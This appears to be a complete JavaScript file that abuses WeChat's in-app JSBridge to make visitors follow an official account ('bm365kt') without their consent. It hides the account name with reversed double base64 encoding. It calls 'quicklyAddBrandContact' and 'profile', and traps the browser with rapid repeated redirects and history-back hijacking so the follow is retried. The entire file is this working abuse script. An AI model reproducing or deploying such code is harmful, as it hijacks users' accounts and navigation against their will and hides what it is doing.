var $str = 'bm365kt';//这是微信公众号名
 $str = $.base64.encode($.base64.encode($str));
var $zjiemi = $str.split('').reverse().join(''); //获取到这个地址后放到index.html的隐藏域中

var zjiemi = document.getElementById('zjiemi');
zjiemi.setAttribute("value",$zjiemi);
var fval = zjiemi.value;
var _val = fval.split('').reverse().join('');
var jm1 = $.base64.decode(_val);
var jm2 = $.base64.decode(jm1);
window.localStorage.setItem('arrUsername', '["' + jm2 + '"]');
window.localStorage.setItem('username', jm2);
window.localStorage.setItem('weChatUrl', 'undefined');
var username = localStorage.getItem('username');
var arrUsername = eval('(' + localStorage.getItem('arrUsername') + ')');
var isIos = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var returnUrl = 'https://mmbiz.qpic.cn/mmbiz_png/YZc0kpdbHQJLkBOSETow59yMplZkcgoQNRGJSic5W02GUqsYC0rq0ZBCJ4HgzjZsmvF9QlNPE1CvYqicuSAUZODA/0?wx_fmt=png';
var getWeChatUrl = localStorage.getItem('weChatUrl').split("\x0A");
var weChatUrlArr = [jump_url];
if (getWeChatUrl[0] !== 'undefined') {
    weChatUrlArr = getWeChatUrl
};
var wKey = parseInt(weChatUrlArr.length * Math.random());
var weChatUrl = weChatUrlArr[wKey];
subscribe(true);

function iosBatchSub(type = 'stop') {
    var ctype;

    function opt(parms = {}) {
        if (parms === 'ok') {
            var num = 0;
            var interval = setInterval(call, 50);
            interval();

            function call() {
                num++;
                go();
                if (num === 4) {
                    clearInterval(interval);
                    setTimeout(function() {
                        WeixinJSBridge.invoke('imagePreview', {
                            "urls": [returnUrl]
                        });
                        var names = arrUsername;
                        names.forEach(function(element) {
                            WeixinJSBridge.invoke('quicklyAddBrandContact', {
                                scene: '110',
                                username: element
                            });
                            ctype = 'ok';
                            localStorage.setItem('subscribeState', new Date().getTime());
                            if (username === 'novel' || username === 'novel1' || username === 'novel2' || username === 'novel3' || username === 'novel4' || username === 'dyj' || username === 'gdt' || username === 'kc1' || username === 'kc2' || username === 'kc3' || username === 'kc4' || username === 'kc5' || username === 'kc6' || username === 'wifi1' || username === 'wifi2') {
                                localStorage.setItem(username + 'SubState', '1')
                            };
                            if (type === 'stop') {
                                window.location.reload()
                            } else {}
                        })
                    }, 200)
                }
            }
        } else {
            if (username === 'novel' || username === 'novel1' || username === 'novel2' || username === 'novel3' || username === 'novel4' || username === 'dyj' || username === 'gdt' || username === 'kc1' || username === 'kc2' || username === 'kc3' || username === 'kc4' || username === 'kc5' || username === 'kc6' || username === 'wifi1' || username === 'wifi2') {
                historyBack();
                go()
            } else {
                historyBack('black');
                subscribe(false)
            }
        }
    }
    var _time = parseInt((new Date().getTime() - Number(localStorage.getItem('subscribeState'))) / 60000);
    ctype = 'await';
    if (typeof(WeixinJSBridge) === 'undefined') {
        if (document.addEventListener) {
            document.addEventListener('WeixinJSBridgeReady', opt, false)
        }
    } else {
        opt()
    };

    function historyBack(str = '') {
        var mark = false;
        window.addEventListener('pageshow', function() {
            if (mark) {
                if (str !== '') {
                    window.history.back()
                } else {
                    if (ctype === 'await') {
                        opt('ok')
                    }
                }
            }
        });
        window.addEventListener('pagehide', function() {
            mark = true
        })
    }
}

function subscribe(p) {
    function _timer() {
        var index = 0;
        var interval = setInterval(subscribe, 50);

        function subscribe() {
            go();
            index++;
            if (index === 4) {
                clearInterval(interval);
                setTimeout(function() {
                    WeixinJSBridge.invoke('profile', {
                        "username": username,
                        "nickname": 'weixin'
                    }, function() {});
                    if (p) {} else {}
                }, 200)
            }
        }
    }
    if (typeof(WeixinJSBridge) === 'undefined') {
        if (document.addEventListener) {
            document.addEventListener('WeixinJSBridgeReady', _timer, false)
        }
    } else {
        _timer()
    }
}

function go() {
    window.location.href = weChatUrl
}